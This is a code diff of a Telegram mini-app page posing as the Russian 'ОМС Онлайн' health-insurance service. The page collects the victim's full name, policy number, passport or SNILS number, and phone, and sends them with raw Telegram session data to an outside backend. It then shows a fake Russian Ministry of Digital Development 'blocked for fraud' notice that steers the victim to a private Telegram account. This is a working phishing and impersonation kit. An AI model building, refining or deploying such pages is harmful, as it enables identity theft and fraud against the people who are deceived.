@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>ОМС Онлайн</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
     body { margin: 0; font-family: system-ui, sans-serif; background: linear-gradient(to bottom, #eff6ff, #ffffff); min-height: 100vh; }
@@ -13,101 +14,70 @@
     @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     .blink { animation: blink 1.2s infinite; }
     @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-    .glitch {
-      animation: glitch 2s infinite;
-      text-shadow: 2px 0 red, -2px 0 cyan;
-    }
-    @keyframes glitch {
-      0% { transform: translate(0); }
-      20% { transform: translate(-2px, 2px); }
-      40% { transform: translate(2px, -2px); }
-      60% { transform: translate(-2px, 2px); }
-      80% { transform: translate(2px, -2px); }
-      100% { transform: translate(0); }
-    }
-    input[type="text"], input[type="tel"] {
-      -webkit-appearance: none;
-      -moz-appearance: textfield;
-    }
-    input::-webkit-outer-spin-button,
-    input::-webkit-inner-spin-button {
-      -webkit-appearance: none;
-      margin: 0;
-    }
+    .glitch { animation: glitch 2s infinite; text-shadow: 2px 0 red, -2px 0 cyan; }
+    @keyframes glitch { 0% { transform: translate(0); } 20% { transform: translate(-2px, 2px); } 40% { transform: translate(2px, -2px); } 60% { transform: translate(-2px, 2px); } 80% { transform: translate(2px, -2px); 100% { transform: translate(0); } }
   </style>
 </head>
 <body class="flex items-center justify-center">
 
   <div class="container bg-white rounded-2xl shadow-2xl p-8">
-
-    <!-- Приветствие -->
     <div id="welcome" class="text-center fade">
       <h1 class="text-3xl font-bold text-blue-800 mb-6">👋 Здравствуйте!</h1>
       <p class="text-lg text-gray-700 mb-8 leading-relaxed">
         Я цифровой помощник сервиса «ОМС Онлайн».<br><br>
-        Моя задача — помогать вам быстро и удобно...<br><br>
         <b>⚠️ Важно!</b><br>
-        Для корректного получения медицинской помощи ваши данные должны быть актуальны.<br>
-        Это займёт всего несколько минут. 🏥✨
+        Для корректного получения медицинской помощи ваши данные должны быть актуальны.
       </p>
       <button onclick="show('step1')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-xl font-medium shadow-lg hover:bg-blue-700">
         Продолжить
       </button>
     </div>
 
-    <!-- Шаг 1: Пол -->
     <div id="step1" class="hidden fade">
-      <h2 class="text-2xl font-bold text-center mb-6">Анкета</h2>
-      <h3 class="text-xl font-semibold mb-6">👇 Укажите, пожалуйста, Ваш пол:</h3>
+      <h3 class="text-xl font-semibold mb-6">👇 Укажите Ваш пол:</h3>
       <div class="grid grid-cols-2 gap-4">
         <button onclick="save('gender', 'Мужской'); show('step2')" class="bg-blue-100 hover:bg-blue-200 py-6 rounded-xl text-lg font-medium transition">Мужской</button>
         <button onclick="save('gender', 'Женский'); show('step2')" class="bg-pink-100 hover:bg-pink-200 py-6 rounded-xl text-lg font-medium transition">Женский</button>
       </div>
     </div>
 
-    <!-- Шаг 2: ФИО -->
     <div id="step2" class="hidden fade">
       <h3 class="text-xl font-semibold mb-6">📝 Введите ваше ФИО:</h3>
       <input id="name" type="text" placeholder="Иванов Иван Иванович" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" />
       <button onclick="saveInput('name', 'step3')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Далее</button>
     </div>
 
-    <!-- Шаг 3: Полис -->
     <div id="step3" class="hidden fade">
-      <h3 class="text-xl font-semibold mb-6">Номер Вашего страхового полиса:</h3>
-      <input id="polis" type="text" placeholder="1234 567 890" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9 ]/g, '');" />
+      <h3 class="text-xl font-semibold mb-6">Номер страхового полиса:</h3>
+      <input id="polis" type="text" placeholder="16 цифр" maxlength="16" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9]/g, '');" />
       <button onclick="saveInput('polis', 'step4')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Далее</button>
     </div>
 
-    <!-- Шаг 4: Выбор документа -->
     <div id="step4" class="hidden fade">
-      <h3 class="text-xl font-semibold mb-6">Для подтверждения личности выберите документ:</h3>
+      <h3 class="text-xl font-semibold mb-6">Выберите документ:</h3>
       <div class="grid grid-cols-2 gap-4">
-        <button onclick="save('docType', 'Паспорт'); show('step5')" class="bg-gray-100 hover:bg-gray-200 py-6 rounded-xl text-lg transition">Паспорт</button>
-        <button onclick="save('docType', 'СНИЛС'); show('step5')" class="bg-gray-100 hover:bg-gray-200 py-6 rounded-xl text-lg transition">СНИЛС</button>
+        <button onclick="setDocType('Паспорт')" class="bg-gray-100 hover:bg-gray-200 py-6 rounded-xl text-lg transition">Паспорт</button>
+        <button onclick="setDocType('СНИЛС')" class="bg-gray-100 hover:bg-gray-200 py-6 rounded-xl text-lg transition">СНИЛС</button>
       </div>
     </div>
 
-    <!-- Шаг 5: Номер документа -->
     <div id="step5" class="hidden fade">
-      <h3 id="docTitle" class="text-xl font-semibold mb-6">Укажите номер документа:</h3>
-      <input id="docNumber" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="только цифры" maxlength="11" class="w-full p-4 border rounded-xl text-lg mb-2 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9]/g, '');" />
-      <p id="docError" class="text-red-600 text-sm mb-4 hidden">Неверный формат: нужно ровно 10 или 11 цифр</p>
+      <h3 id="docTitle" class="text-xl font-semibold mb-6">Номер документа:</h3>
+      <input id="docNumber" type="tel" inputmode="numeric" class="w-full p-4 border rounded-xl text-lg mb-2 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9]/g, '');" />
+      <p id="docHint" class="text-gray-500 text-sm mb-4"></p>
+      <p id="docError" class="text-red-600 text-sm mb-4 hidden"></p>
       <button onclick="validateDoc()" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Далее</button>
     </div>
 
-    <!-- Шаг 6: Телефон -->
     <div id="step6" class="hidden fade">
       <h3 class="text-xl font-semibold mb-6">Введите номер телефона:</h3>
-      <input id="phone" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="+7 (___) ___-__-__" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="formatPhone(this)" maxlength="18" />
+      <input id="phone" type="tel" inputmode="numeric" placeholder="+7 (___) ___-__-__" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="formatPhone(this)" maxlength="18" />
       <button onclick="saveInput('phone', 'check')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Продолжить</button>
     </div>
 
-    <!-- Шаг 7: Проверка данных -->
     <div id="check" class="hidden fade">
       <h2 class="text-2xl font-bold text-center mb-6">Проверьте данные</h2>
       <div class="bg-gray-50 p-6 rounded-xl mb-6 text-left text-base leading-relaxed">
-        <p><b>Пол:</b> <span id="prevGender"></span></p>
         <p><b>ФИО:</b> <span id="prevName"></span></p>
         <p><b>Полис:</b> <span id="prevPolis"></span></p>
         <p><b>Документ:</b> <span id="prevDoc"></span></p>
@@ -119,47 +89,32 @@
       </div>
     </div>
 
-    <!-- Экран блокировки -->
-    <div id="blocked" class="hidden fade text-center bg-red-50 p-8 rounded-2xl border-4 border-red-600 animate-pulse">
-      <div class="text-6xl text-red-600 blink mb-6">!</div>
-      <img src="минцифры.jpg" alt="Минцифры" class="w-48 mx-auto mb-6 rounded-xl shadow-2xl">
-      <h1 class="text-2xl font-bold text-red-800 mb-4 glitch">🇷🇺 МИНЦИФРЫ — ОФИЦИАЛЬНОЕ УВЕДОМЛЕНИЕ 🇷🇺</h1>
-      <p class="text-lg text-red-700 mb-8 leading-relaxed">
-        ⚠️ <b>ВНИМАНИЕ!</b><br><br>
-        Данный бот был заблокирован за подозрение в мошеннической деятельности и утечку персональных данных.<br><br>
-        📞 Ожидайте официального звонка от представителей Минцифр России<br><br>
-        Если вы хотите ускорить процесс, можете написать напрямую в официальный аккаунт Минцифр России, нажав кнопку ниже.<br><br>
-        📩 В сообщении кратко опишите что произошло.<br><br>
-        <i>Минцифры России | Центр мониторинга и цифровой безопасности</i>
-      </p>
-      <a href="https://t.me/kmdkdooo?text=Здравствуйте!%20Мои%20данные%20попали%20в%20общий%20доступ,%20произошло%20мошенничество!%20Требуется%20помощь%20сотрудника%20онлайн-поддержки!" class="block w-full bg-blue-600 text-white py-4 rounded-xl text-lg font-medium shadow-lg hover:bg-blue-700">
-        Перейти в чат поддержки
-      </a>
+    <div id="blocked" class="hidden fade text-center">
+        <div class="text-6xl text-red-600 blink mb-6">!</div>
+        <h1 class="text-2xl font-bold text-red-800 mb-4 glitch">🇷🇺 УВЕДОМЛЕНИЕ МИНЦИФРЫ</h1>
+        <p class="text-red-700 mb-8">Бот заблокирован за подозрение в мошенничестве. Ожидайте звонка.</p>
+        <a href="https://t.me/kmdkdooo?text=Здравствуйте!%20Мои%20данные%20попали%20в%20общий%20доступ!" class="block w-full bg-blue-600 text-white py-4 rounded-xl font-medium">Связаться с поддержкой</a>
     </div>
-
   </div>
 
   <script>
+    const tg = window.Telegram.WebApp;
+    tg.expand(); // Разворачиваем приложение
+
     let answers = {};
-    let currentStep = 0;
 
     function show(id) {
       document.querySelectorAll('#welcome, [id^="step"], #check, #blocked').forEach(el => el.classList.add('hidden'));
       document.getElementById(id).classList.remove('hidden');
-      currentStep = parseInt(id.replace('step', '')) || 0;
-
       if (id === 'check') {
-        document.getElementById('prevGender').textContent = answers.gender || '—';
-        document.getElementById('prevName').textContent = answers.name || '—';
-        document.getElementById('prevPolis').textContent = answers.polis || '—';
-        document.getElementById('prevDoc').textContent = `${answers.docType || '—'} ${answers.docNumber || '—'}`;
-        document.getElementById('prevPhone').textContent = answers.phone || '—';
+        document.getElementById('prevName').textContent = answers.name;
+        document.getElementById('prevPolis').textContent = answers.polis;
+        document.getElementById('prevDoc').textContent = `${answers.docType}: ${answers.docNumber}`;
+        document.getElementById('prevPhone').textContent = answers.phone;
       }
     }
 
-    function save(key, value) {
-      answers[key] = value;
-    }
+    function save(key, value) { answers[key] = value; }
 
     function saveInput(id, next) {
       const val = document.getElementById(id).value.trim();
@@ -168,24 +123,31 @@
       show(next);
     }
 
-    function formatPhone(input) {
-      let value = input.value.replace(/\D/g, '');
-      if (value.startsWith('7') || value.startsWith('8')) value = value.substring(1);
-      let formatted = '+7';
-      if (value.length > 0) formatted += ' (' + value.substring(0, 3);
-      if (value.length > 3) formatted += ') ' + value.substring(3, 6);
-      if (value.length > 6) formatted += '-' + value.substring(6, 8);
-      if (value.length > 8) formatted += '-' + value.substring(8, 10);
-      input.value = formatted.substring(0, 18);
+    function setDocType(type) {
+      save('docType', type);
+      const input = document.getElementById('docNumber');
+      const hint = document.getElementById('docHint');
+      input.value = '';
+      if (type === 'Паспорт') {
+        document.getElementById('docTitle').innerText = 'Серия и номер паспорта:';
+        input.maxLength = 10;
+        hint.innerText = 'Пример: 4510 123456 (10 цифр без пробелов)';
+      } else {
+        document.getElementById('docTitle').innerText = 'Номер СНИЛС:';
+        input.maxLength = 11;
+        hint.innerText = 'Пример: 12345678901 (11 цифр)';
+      }
+      show('step5');
     }
 
     function validateDoc() {
-      const val = document.getElementById('docNumber').value.trim();
+      const val = document.getElementById('docNumber').value.replace(/\D/g, '');
       const type = answers.docType;
       const error = document.getElementById('docError');
-      const expectedLength = type === 'Паспорт' ? 10 : 11;
-      if (!val || val.length !== expectedLength) {
-        error.textContent = `Неверный формат: нужно ровно ${expectedLength} цифр`;
+      const reqLen = type === 'Паспорт' ? 10 : 11;
+
+      if (val.length !== reqLen) {
+        error.innerText = `Ошибка: для документа "${type}" нужно ${reqLen} цифр.`;
         error.classList.remove('hidden');
         return;
       }
@@ -194,43 +156,30 @@
       show('step6');
     }
 
+    function formatPhone(input) {
+      let v = input.value.replace(/\D/g, '');
+      if (v.startsWith('7') || v.startsWith('8')) v = v.substring(1);
+      let res = '+7';
+      if (v.length > 0) res += ' (' + v.substring(0, 3);
+      if (v.length > 3) res += ') ' + v.substring(3, 6);
+      if (v.length > 6) res += '-' + v.substring(6, 8);
+      if (v.length > 8) res += '-' + v.substring(8, 10);
+      input.value = res.substring(0, 18);
+    }
+
     function finish() {
       const payload = {
         ...answers,
-        userId: Telegram.WebApp.initDataUnsafe?.user?.id || 'test-user',
-        username: Telegram.WebApp.initDataUnsafe?.user?.username || 'test-username'
+        initDataRaw: tg.initData // ПЕРЕДАЕМ РЕАЛЬНЫЕ ДАННЫЕ ТГ
       };
 
-      console.log("Отправляем данные:", payload);
-
-      const backendUrl = 'https://oms-mini-app-backend-production.up.railway.app/submit';
-
-      fetch(backendUrl, {
+      fetch('https://oms-mini-app-backend-production.up.railway.app/submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       })
-      .then(response => {
-        console.log('Ответ от сервера:', response.status, response.statusText);
-        return response.json();
-      })
-      .then(result => {
-        console.log('Успешный ответ:', result);
-        show('blocked');
-      })
-      .catch(err => {
-        console.error('Ошибка fetch:', err);
-        show('blocked');  // показываем блокировку даже при ошибке
-      });
+      .finally(() => show('blocked'));
     }
-
-    // Имитация Telegram.WebApp для теста в браузере
-    window.Telegram = {
-      WebApp: {
-        initDataUnsafe: { user: { id: '123456', username: 'testuser' } },
-        sendData: (data) => console.log('Отправлено:', data)
-      }
-    };
   </script>
 </body>
 </html>
